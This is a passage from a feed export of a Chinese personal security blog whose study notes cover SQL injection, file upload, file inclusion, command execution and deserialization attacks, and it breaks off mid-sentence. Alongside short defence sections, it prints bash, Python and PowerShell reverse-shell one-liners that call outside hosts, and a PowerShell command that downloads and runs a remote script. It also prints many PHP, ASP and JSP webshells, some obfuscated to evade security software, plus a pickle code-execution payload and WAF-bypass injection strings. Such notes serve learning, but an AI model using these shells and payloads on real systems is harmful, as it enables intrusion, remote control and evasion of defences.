sysobjects)&gt;1</p><p>返回系统错误500，基本确定不是mssql</p><p>返回正常数据，是mssql</p><p>acess需要猜解表名  exits(select * from tb_name)</p><p>里面没有库，因此没有information_schema</p><h5 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h5><p>一般情况下需要判断access还是mssql数据库</p><p>and exits(select count(*) from sysobjects)&gt;1</p><p>返回正常数据，是mssql</p><p>报错注入</p><p>(select @@version)&gt;123</p><p>会显示version内容</p><p>;exec 使用</p><h5 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h5><p>类似于mysql</p><h4 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h4><p>大小写</p><p>空格转 /<em>a</em>/</p><p>函数中间加空格</p><p>双写</p><h4 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h4><h4 id="二次编码"><a href="#二次编码" class="headerlink" title="二次编码"></a>二次编码</h4><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>预编译  php使用pdo  asp写法  select * from user where id = ‘?’ bind id=1</p><p>sql注入漏洞根本原因是因为sql语句是由代码拼接组成</p><h4 id="mogodb"><a href="#mogodb" class="headerlink" title="mogodb"></a>mogodb</h4><p>php可以传递数组</p><p>a[$ne] = sdf</p><p>a[$regex] = ^flag$</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><h4 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h4><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h4><p>js禁用</p><h4 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h4><h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><p>尝试截断  // 需要指定保存路径进行配合</p><p>解析漏洞</p><p>iis 6 a.php;.jpg   a.php/a.jpg  7.5  a.jpg/a.php</p><p>nginx a.jpg/a.php</p><p>apache a.php.a.b</p><h5 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h5><p>加空格</p><p>加::$DATA</p><p>加.</p><p>上传.htaccess</p><p>.php3  .phtml .cer .jspx .aspx</p><h5 id="内容检测"><a href="#内容检测" class="headerlink" title="内容检测"></a>内容检测</h5><p>制作图片马</p><p>copy a.jpg /b + b.php /a hack.php</p><p>cat a.php &gt;&gt; b.jpg</p><p>winhex编辑</p><p>mime类型检测</p><p>burp改类型</p><h5 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h5><h5 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h5><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>../</p><p>包含日志</p><p>包含上传的图片</p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>http://</p><p>伪协议</p><p>php://input</p><p>php://filter/…</p><p>data/text/plain,1</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>eval</p><p>assert</p><p>preg_replace(‘/adsa/e’,’’,’’)</p><p>1’ “  ; phpinfo();</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>system</p><p>分操作系统</p><h4 id="linux-amp-amp-amp"><a href="#linux-amp-amp-amp" class="headerlink" title="linux  ; &amp; | || &amp;&amp;"></a>linux  ; &amp; | || &amp;&amp;</h4><p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;1&amp;</p><p>curl <a href="https://www.baidu.com/`whoami`.txt" target="_blank" rel="noopener">https://www.baidu.com/`whoami`.txt</a></p><h4 id="windows-amp-amp-amp"><a href="#windows-amp-amp-amp" class="headerlink" title="windows  || | &amp;  &amp;&amp;"></a>windows  || | &amp;  &amp;&amp;</h4><p>ping + dnslog</p><p>powershell 反弹cmd</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>需要审计</p><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p>固定payload,进行命令执行</p><p>import os</p><p>class abc(project):</p><p>def <strong>reduce</strong>(self):</p><p>return (os.system,(‘whoami’,))</p><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>审计</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:经过前一阵子的学习，对前面部分的漏洞进行小的总结&lt;/p&gt;
&lt;h2 id=&quot;web漏洞&quot;&gt;&lt;a href=&quot;#web漏洞&quot; class=&quot;headerlink&quot; title=&quot;web漏洞&quot;&gt;&lt;/a&gt;web漏洞&lt;/h2&gt;&lt;h3 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>文件包含和命令执行</title>
    <link href="https://wocao828.github.io/2019/01/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://wocao828.github.io/2019/01/20/文件包含和命令执行/</id>
    <published>2019-01-20T10:14:31.000Z</published>
    <updated>2019-01-20T11:06:12.878Z</updated>
    
    <content type="html"><![CDATA[<p>前言:文件包含漏洞和命令执行漏洞虽然很难在黑盒测试下发现，但其危害还是很大的。</p><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p>php:include(),include_once(), require(),require_once(), fopen(),readfile()</p><p>jsp: java.io.File(), java.io.FileReader()</p><p>asp: include file, include virtual</p><h3 id="文件包含漏洞危害"><a href="#文件包含漏洞危害" class="headerlink" title="文件包含漏洞危害"></a>文件包含漏洞危害</h3><h4 id="1-敏感信息泄露"><a href="#1-敏感信息泄露" class="headerlink" title="1.敏感信息泄露"></a>1.敏感信息泄露</h4><h4 id="2-获取webshell"><a href="#2-获取webshell" class="headerlink" title="2.获取webshell"></a>2.获取webshell</h4><h4 id="3-任意命令执行"><a href="#3-任意命令执行" class="headerlink" title="3.任意命令执行"></a>3.任意命令执行</h4><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>../../../../读取目录文件</p><p>限制方法：php.ini中open_basedir=www目录：限制只能打开指定路径的文件</p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>限制条件：php.ini文件中allow_url_include=on</p><h3 id="常用伪协议的使用"><a href="#常用伪协议的使用" class="headerlink" title="常用伪协议的使用"></a>常用伪协议的使用</h3><p>file://   http://   ftp://   php://   data://</p><p>include $_GET[]能用所有伪协议</p><h4 id="1-file-的使用"><a href="#1-file-的使用" class="headerlink" title="1.file://的使用"></a>1.file://的使用</h4><p>allow_url_fopen  on/off   allow_url_include on/off</p><p><a href="http://www.xxx.com?file=file://c:/windows/1.txt(读脚本文件)" target="_blank" rel="noopener">www.xxx.com?file=file://c:/windows/1.txt(读脚本文件)</a></p><h4 id="2-php-的使用"><a href="#2-php-的使用" class="headerlink" title="2.php://的使用"></a>2.php://的使用</h4><p>php://filter</p><p>allow_url_fopen  on/off   allow_url_include on/off</p><p>php://filter/read/convert.base64-encode/resource=路径+文件名(读脚本文件)</p><p>php://input</p><p>allow_url_include  on    allow_url_fopen  on/off</p><p><a href="http://www.xxx.com?file=php://input" target="_blank" rel="noopener">www.xxx.com?file=php://input</a>&lt;?php phpinfo();?&gt;(写文件)</p><h4 id="3-data"><a href="#3-data" class="headerlink" title="3.data://"></a>3.data://</h4><p>allow_url_fopen  on   allow_url_include on</p><p><a href="http://www.xxx.com/?file=data://text/plain" target="_blank" rel="noopener">www.xxx.com/?file=data://text/plain</a>,&lt;?php phpinfo();?&gt;</p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><h4 id="1-设置白名单"><a href="#1-设置白名单" class="headerlink" title="1.设置白名单"></a>1.设置白名单</h4><h4 id="2-过滤危险字符"><a href="#2-过滤危险字符" class="headerlink" title="2.过滤危险字符"></a>2.过滤危险字符</h4><h4 id="3-设置文件目录"><a href="#3-设置文件目录" class="headerlink" title="3.设置文件目录"></a>3.设置文件目录</h4><h4 id="4-关闭危险配置"><a href="#4-关闭危险配置" class="headerlink" title="4.关闭危险配置"></a>4.关闭危险配置</h4><h4 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h4><p>/var/log/httpd/access_log(需要权限)</p><p>/var/www/logs/access_log</p><p>/var/log/access_log</p><h4 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h4><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>php:eval,assert,preg_replace</p><p>asp:eval,exevute</p><p>jsp:可以使用反射机制</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>php:system,exec,shell_exec,popen,</p><p>asp:exec,shell_exec</p><p>jsp:runtime,getruntime().exec()</p><p>windows：&amp;,&amp;&amp;,||,|</p><p>linux：&amp;,&amp;&amp;,||,|,; (反引号在linux中可以执行)</p><h3 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h3><h4 id="linux下shell反弹"><a href="#linux下shell反弹" class="headerlink" title="linux下shell反弹"></a>linux下shell反弹</h4><p>攻击者:nc -lvp 6666</p><p>bash</p><p>‘’’/bin/bash -i &gt;&amp; /dev/tcp/207.148.89.116/6666 0&gt;&amp;1’’’</p><p>python</p><p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p><p>更多linux shell详见<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>攻击者:nc -lvp 6666</p><p>反弹cmd shell</p><p>powershell IEX (New-Object System.Net.Webclient).DownloadString(‘<a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)" target="_blank" rel="noopener">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</a>;<br>powercat -c 192.168.159.134 -p 6666 -e cmd</p><p>更多powershell详见<a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99793</a></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h4><p>函数 serialize()  unserialize()</p><p>序列化serialize($a)</p><p>反序列化</p><p>类的三个函数:</p><p>function __construct（）–&gt;构造函数时执行</p><p>function __destrunt()–&gt;析构时执行</p><p>function__wakeup()–&gt;反序列化时执行</p><p>反序列化函数-&gt;class-&gt;wakeup()\tostring()</p><p>php反序列化时函数定义的变量会消失</p><h4 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h4><p>序列化：pickle.dumps、反序列化：pickle.loads</p><p>固定payload,进行命令执行</p><p>import os<br>class abc(project):<br>    def <strong>reduce</strong>(self):<br>        return (os.system,(‘whoami’,))</p><h4 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:文件包含漏洞和命令执行漏洞虽然很难在黑盒测试下发现，但其危害还是很大的。&lt;/p&gt;
&lt;h3 id=&quot;常见函数&quot;&gt;&lt;a href=&quot;#常见函数&quot; class=&quot;headerlink&quot; title=&quot;常见函数&quot;&gt;&lt;/a&gt;常见函数&lt;/h3&gt;&lt;p&gt;php:include(),i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://wocao828.github.io/2019/01/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://wocao828.github.io/2019/01/20/文件上传漏洞/</id>
    <published>2019-01-20T06:40:11.000Z</published>
    <updated>2019-01-20T08:42:39.066Z</updated>
    
    <content type="html"><![CDATA[<p>前言:文件上传漏洞可以说是渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。本次了解一下上传漏洞。</p><h3 id="webshell与中国菜刀"><a href="#webshell与中国菜刀" class="headerlink" title="webshell与中国菜刀"></a>webshell与中国菜刀</h3><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>黑客在入侵一个网站后，会留下一个asp或php网站web服务器进行交互，得到一个命令执行环境，以达到控制网站服务器的目的。这个后门就是webshell。</p><h4 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h4><p>可以管理动态脚本，他的控制端仅仅需要一句话，被当作管理webshell的工具使用</p><h2 id="一句话木马-webshell的一种"><a href="#一句话木马-webshell的一种" class="headerlink" title="一句话木马(webshell的一种)"></a>一句话木马(webshell的一种)</h2><h3 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h3><h4 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h4><p>把字符串按照php代码来计算，该字符必须是合法的php代码，且以分号结尾。</p><h4 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h4><p>检查一个断言是否为 FALSE</p><h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><p>php超全局变量用于收集表单数据，是由post方法发送</p><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><p>php超全局变量用于收集表单数据，是由get方法发送</p><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>既可以接收post请求也可以接收get请求</p><h4 id="一句话木马简单写"><a href="#一句话木马简单写" class="headerlink" title="一句话木马简单写"></a>一句话木马简单写</h4><p>&lt;?php  eval($_POST[‘pass’]);  ?&gt;</p><p>&lt;?php  assert($_POST[‘pass’]); ?&gt;</p><p>&lt;?php system($_REQUEST[‘pass’]);?&gt;</p><p>&lt;?fputs(fopen(c.php,w),&lt;?eval($_POST[c]);?&gt;)?&gt;</p><!-- <?$_POST['sa']($_POST['sb']);?> --><p>&lt;?php $k = str_replace(“8”,””,”a8s88s8e8r88t”);$k($_POST[“8”]); ?&gt;</p><h4 id="一句话木马变形"><a href="#一句话木马变形" class="headerlink" title="一句话木马变形"></a>一句话木马变形</h4><p>&lt;?php</p><p>$a=md5(‘a’).’<br>‘;</p><p>$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);</p><p>$poc($_GET[‘a’]);</p><p>?&gt;</p><p>&lt;?php</p><p>function kill($ki,$ke){</p><pre><code>define($ki,$ke);</code></pre><p>}</p><p>kill(“NA”,”$_POST[x]”);</p><p>eval(NA);</p><p>echo NA;</p><p>?&gt;</p><p>&lt;?php </p><p>if(isset($_POST[‘content’]) &amp;&amp; isset($_POST[‘ext’]))</p><p>{</p><pre><code>$data = $_POST[&apos;content&apos;]; $ext = $_POST[&apos;ext&apos;]; //var_dump(preg_match(&apos;/\&lt;/&apos;,$data)); if(preg_match(&apos;/\&lt;/&apos;,$data))  {die(&apos;hack&apos;);   }</code></pre><p>$filename = time();</p><p>file_put_contents($filename.$ext, $data);<br>}</p><p>?&gt;</p><p>content[]=&lt;?php phpinfo();?&gt;&amp;ext=php</p><h4 id="过狗一句话木马"><a href="#过狗一句话木马" class="headerlink" title="过狗一句话木马"></a>过狗一句话木马</h4><h5 id="1-将关键字替换"><a href="#1-将关键字替换" class="headerlink" title="1.将关键字替换"></a>1.将关键字替换</h5><h5 id="2-使用回调函数"><a href="#2-使用回调函数" class="headerlink" title="2.使用回调函数"></a>2.使用回调函数</h5><p>(1)create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令</p><p>&lt;?php </p><p>//?cmd=phpinfo();</p><p>$func =create_function(‘’,$_REQUEST[‘cmd’]);</p><p>$func();</p><p>?&gt;</p><p>(2)array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</p><p>(3)call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数.</p><p>(4)array_filter()依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p>(5)file_put_contents() 函数把一个字符串写入文件中。</p><p>(6)fputs() 函数写入文件</p><p>一个过狗的一句话木马变形</p><p>&lt;?php</p><p>@$a=array($_POST[‘pass’]);</p><p>@$b=array($_POST[‘pass’]);</p><p>array_udiff_uassoc($a,$b,’assert’,’assert’);</p><p>?&gt;</p><h3 id="asp一句话木马"><a href="#asp一句话木马" class="headerlink" title="asp一句话木马"></a>asp一句话木马</h3><h4 id="asp一句话木马简单写"><a href="#asp一句话木马简单写" class="headerlink" title="asp一句话木马简单写"></a>asp一句话木马简单写</h4><p>&lt;%eval request(“pass”);%&gt;</p><p>&lt;%execute request(“pass”)%&gt;</p><p>&lt;%eval_r(Request(“0x001”))%&gt;</p><p>&lt;%ExecuteGlobal request(“pass”)%&gt;</p><p>&lt;%Eval(Request(chr(35)))%&gt;</p><h4 id="asp一句话木马变形"><a href="#asp一句话木马变形" class="headerlink" title="asp一句话木马变形"></a>asp一句话木马变形</h4><p>&lt;%</p><p>Function MorfiCoder(Code)</p><p>MorfiCoder=Replace(Replace(StrReverse(Code),”/<em>/“,””””),”\</em>\”,vbCrlf)</p><p>End Function</p><p>Execute MorfiCoder(“)/<em>/z/</em>/(tseuqer lave”)</p><p>%&gt;</p><h4 id="asp过狗一句话木马"><a href="#asp过狗一句话木马" class="headerlink" title="asp过狗一句话木马"></a>asp过狗一句话木马</h4><p>&lt;%@ LANGUAGE = “VBScript.Encode”%&gt;</p><p>&lt;%#@~^IQAAAA==3X+^!YMVK4msPM+5E/OcrSl    [MM+Xrb+AsAAA==^#~@%&gt;</p><h4 id="jsp一句话木马"><a href="#jsp一句话木马" class="headerlink" title="jsp一句话木马"></a>jsp一句话木马</h4><p><code>&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;</code></p><p>&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;</p><p>&lt;%new java.io.FileOutputStream(request.getParameter(“f”)).write(request.getParameter(“c”).getBytes());%&gt;</p><h3 id="更多webshell请到https-github-com-tennc-webshell"><a href="#更多webshell请到https-github-com-tennc-webshell" class="headerlink" title="更多webshell请到https://github.com/tennc/webshell"></a>更多webshell请到<a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></h3><h2 id="文件上传检测"><a href="#文件上传检测" class="headerlink" title="文件上传检测"></a>文件上传检测</h2><h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><h4 id="js校验"><a href="#js校验" class="headerlink" title="js校验"></a>js校验</h4><p>绕过方法</p><p>1.禁用，删除，修改js</p><p>2.使用代理上传</p><h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><h4 id="mime文件类型校验"><a href="#mime文件类型校验" class="headerlink" title="mime文件类型校验"></a>mime文件类型校验</h4><p>绕过方法</p><p>使用burpsuite修改mime文件类型</p><h4 id="扩展名验证"><a href="#扩展名验证" class="headerlink" title="扩展名验证"></a>扩展名验证</h4><h5 id="白名单验证"><a href="#白名单验证" class="headerlink" title="白名单验证"></a>白名单验证</h5><p>绕过方法:</p><p>(1)00截断   (php5.2) 特性  路径的截断  eq:404.php%00.jpg</p><p>(2)ntfs文件流截断 (windows)</p><p>(3)解析漏洞</p><p>1.iis6.0解析漏洞</p><p><a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a></p><p><a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a></p><p>便可以解析为asp文件</p><p>2.apache解析漏洞</p><p>test.php.a.b(不能利用)</p><p>3.nginx1.4.6解析漏洞</p><p><a href="http://www.xxx.com/upload/1.jpg%00.php" target="_blank" rel="noopener">www.xxx.com/upload/1.jpg%00.php</a></p><p><a href="http://www.xxx.com/upload/1.jpg%20\0.php" target="_blank" rel="noopener">www.xxx.com/upload/1.jpg%20\0.php</a></p><p>4.iis7.5解析漏洞</p><p>与nginx类似<a href="http://www.xxx.com/upload/1.jpg/1.php" target="_blank" rel="noopener">www.xxx.com/upload/1.jpg/1.php</a></p><h5 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h5><p>1.大小写绕过(windows不区分大小写，linux区分大小写，不能用大小写绕过)</p><p>2.黑名单扩展名漏网</p><p>.php3  .phtml .cer .jspx .aspx .htaccess</p><p>.htaccess</p><p>SetHandler application/x-httpd-php</p><p>AddHandler application/x-httpd-php  .txt .jpg</p><p>3.windows系统漏洞</p><p>test.asp(空格)</p><p>test.php.</p><p>test.php::$DATA</p><h4 id="文件内容校验"><a href="#文件内容校验" class="headerlink" title="文件内容校验"></a>文件内容校验</h4><p>绕过方法:制作图片马</p><p>1.copy a.jpg /b + b.php /a hack.php  (windwos)</p><p>2.cat a.php &gt;&gt; b.jpg   (linux)</p><p>3.winhex编辑</p><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><h4 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1.垃圾数据"></a>1.垃圾数据</h4><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><h4 id="2-filename"><a href="#2-filename" class="headerlink" title="2.filename"></a>2.filename</h4><p>针对早期版本安全狗，可以多加一个filename</p><h4 id="3-waf本身缺陷"><a href="#3-waf本身缺陷" class="headerlink" title="3.waf本身缺陷"></a>3.waf本身缺陷</h4><p>删除实体里面的Conten-Type字段</p><p>删除Content-Disposition字段里的空格</p><p>修改Content-Disposition字段值的大小写</p><p>Boundary边界不一致</p><p>文件名处回车</p><p>多个Content-Disposition</p><h4 id="4-文件重命名绕过"><a href="#4-文件重命名绕过" class="headerlink" title="4.文件重命名绕过"></a>4.文件重命名绕过</h4><h4 id="5-特殊的长文件名绕过"><a href="#5-特殊的长文件名绕过" class="headerlink" title="5.特殊的长文件名绕过"></a>5.特殊的长文件名绕过</h4><p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p><h4 id="6-反删除"><a href="#6-反删除" class="headerlink" title="6.反删除"></a>6.反删除</h4><h3 id="文件上传防护"><a href="#文件上传防护" class="headerlink" title="文件上传防护"></a>文件上传防护</h3><h4 id="1-最有效的，将文件上传目录直接设置为不可执行"><a href="#1-最有效的，将文件上传目录直接设置为不可执行" class="headerlink" title="1.最有效的，将文件上传目录直接设置为不可执行"></a>1.最有效的，将文件上传目录直接设置为不可执行</h4><h4 id="2-对文件类型检查：强烈推荐白名单方式，结合MIME-Type、后缀检查等方式"><a href="#2-对文件类型检查：强烈推荐白名单方式，结合MIME-Type、后缀检查等方式" class="headerlink" title="2.对文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式"></a>2.对文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式</h4><h4 id="3-使用随机数改写文件名和文件路径"><a href="#3-使用随机数改写文件名和文件路径" class="headerlink" title="3.使用随机数改写文件名和文件路径"></a>3.使用随机数改写文件名和文件路径</h4><h4 id="4-单独设置文件服务器的域名-成本比较高"><a href="#4-单独设置文件服务器的域名-成本比较高" class="headerlink" title="4.单独设置文件服务器的域名(成本比较高)"></a>4.单独设置文件服务器的域名(成本比较高)</h4><h4 id="5-可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护"><a href="#5-可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护" class="headerlink" title="5.可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护"></a>5.可以安装服务器安全狗和网站安全狗，对服务器和网站进行安全守护</h4><h4 id="6-隐藏上传文件路径"><a href="#6-隐藏上传文件路径" class="headerlink" title="6.隐藏上传文件路径"></a>6.隐藏上传文件路径</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:文件上传漏洞可以说是渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。本次了解一下上传漏洞。&lt;/p&gt;
&lt;h3 id=&quot;webshell与中国菜刀&quot;&gt;&lt;a href=&quot;#webshell与中国菜刀&quot; class=&quot;headerlink&quot; title=&quot;web
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql手工注入补充</title>
    <link href="https://wocao828.github.io/2019/01/06/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%85/"/>
    <id>https://wocao828.github.io/2019/01/06/sql手工注入补充/</id>
    <published>2019-01-06T06:35:16.000Z</published>
    <updated>2019-01-20T11:16:33.897Z</updated>
    
    <content type="html"><![CDATA[<p>前言:上次了解了基础的手工注入，本次继续补充手工注入方法</p><h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>sql语句insert into messages (title,message,……) values (‘hello’,’123’,……);</p><p>在insert中输入</p><p>123’) #</p><p>123’,1) #</p><p>123’,1,1) #</p><p>123’,1,1,1) #</p><p>123’,1,1,1…..) #</p><p>猜解注入点及后面的字段</p><p>将显示的地方改为查询语句</p><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>sql语句update users set pass = ‘123456’ where name = ‘admin’;</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>123’ and sleep(1) #</p><p>123” and sleep(1) #</p><p>123’) and sleep(1) #</p><p>123”) and sleep(1) #</p><p>应当使用时间盲注123’ where id = 1 and if(length(version())&gt;5,sleep(3),0) #</p><h4 id="上传图片的update注入"><a href="#上传图片的update注入" class="headerlink" title="上传图片的update注入"></a>上传图片的update注入</h4><p>hello’.jpg</p><p>hello’ where sleep(3)#.jpg</p><p>hello’ where id = 1 and sleep(3)#.jpg</p><p>hello’ where id = 1 and if(length(version())&gt;5,sleep(3),0)#.jpg</p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>sql语句delete from users where  id = ‘57’ and name = ‘zs’;</p><p>zs’ and sleep(3)#</p><p>如果不想真的删除一条数据，就可以使用时间延时盲注，注意if语句返回结果都是0</p><p>delete from users where  id = ‘57’ and name = ‘zs’ and if(length(version())&gt;5,sleep(3),0) #’;</p><p>如果数据足够多，就是用布尔盲注</p><p>delete from users where  id = ‘57’ and name = ‘qwerdfzs’ and length(version())&gt;5 #’;</p><h3 id="sql注入预防"><a href="#sql注入预防" class="headerlink" title="sql注入预防"></a>sql注入预防</h3><p>addslashes函数(不能预防数字型注入)</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>编码是gbk编码，utf-8没有宽字节注入</p><p>在注入编码参数加入%df</p><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>对用户的字符串已经进行了转换</p><p>参数加入%2527</p><h3 id="注入工具"><a href="#注入工具" class="headerlink" title="注入工具"></a>注入工具</h3><p>sqlmap的使用(其他工具的简单使用中介绍)</p><h3 id="sql注入wafbypass"><a href="#sql注入wafbypass" class="headerlink" title="sql注入wafbypass"></a>sql注入wafbypass</h3><p>1.大小写混合(可能性很低)</p><p>eq:uNIoN sELecT 1,2,3,4</p><p>2.多写关键字</p><p>eq:UNIunionON SELselectECT 1,2,3,4</p><p>3.编码</p><p>url编码 eq:%252f%252a*/UNION%252f%252a </p><p>4.使用注释</p><p>常见注释://, – , /**/, #, –+,–  -, ;，–a</p><p>%55nION/**/%53ElecT 1,2,3,4</p><p>内联注释(只有mysql识别) eq:/<em>!UNION</em>/ /<em>!SELECT</em>/ 1,2,3</p><p>5.等价函数与命令</p><p>sleep() ==&gt;benchmark()</p><p>concat_ws()==&gt;group_concat()</p><p>mid()、substr() ==&gt; substring()</p><p>6.特殊字符</p><p>反引号  例如select <code>version()</code></p><p>“-+.”，select+id-1+1.from users;</p><p>@符号，select@^1.from users;</p><p>可能发挥大作用的字符:~、!、@、%、()、[]、.、-、+ 、|、%00</p><p>关键字拆分：‘se’+’lec’+’t’</p><p>!和()：’ or –+2=- -!!!’2</p><p>7.http参数控制</p><p>HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><p>8.缓冲区溢出</p><p>and (select 1)=(Select 